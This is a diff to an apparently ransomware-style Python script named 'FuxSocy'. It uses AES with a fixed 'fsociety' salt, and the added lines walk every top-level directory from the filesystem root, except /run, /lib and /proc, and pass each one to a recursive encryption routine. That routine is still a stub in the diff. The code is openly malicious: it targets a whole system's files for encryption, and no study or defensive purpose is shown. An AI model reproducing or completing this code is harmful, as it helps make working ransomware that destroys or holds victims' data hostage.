@@ -9,6 +9,14 @@ from Crypto.Cipher import AES
 from Crypto import Random
 
 SALT = 'fsociety'
+START = '/'
+
+
+def recurse(dir, key):
+    root = next(os.walk(dir))[0]
+    dirs = next(os.walk(dir))[1]
+    files = next(os.walk(dir))[2]
+    # print('root={0}, dir={1}, file={2}'.format(root, dirs, files))
 
 
 def generate_key(salt):
@@ -45,16 +53,32 @@ def update(progress):
     if progress >= 1:
         progress = 1
         status = "COMPLETE"
-    block = int(round(barLenght*progress))
-    loading = "\r{0}\t\t{1}".format("#"*block + " " * (barLenght - block), status)
+    block = int(round(barLenght * progress))
+    loading = "\r{0}\t\t{1}".format("#" * block + " " * (barLenght - block), status)
     sys.stdout.write(loading)
     sys.stdout.flush()
+
 
 def main():
     subprocess.call('clear')
     print('Executing FuxSocy')
     key = generate_key(SALT)
     print("ket", key)
+    print('Locating target files...')
+    dirs = next(os.walk(START))[1]
+    print(dirs)
+    time.sleep(0.7)
+    print('Beginning crypto operations')
+    for dir in dirs:
+        if START == '/':
+            directory = START + dir
+            print('if ', directory)
+        else:
+            directory = START + '/' + dir
+            print('else ', directory)
+        if (directory != '/run') and (directory != '/lib') and (directory != '/proc'):
+            print('Encrypting {}'.format(directory))
+            recurse(directory, key)
 
 
 if __name__ == '__main__':
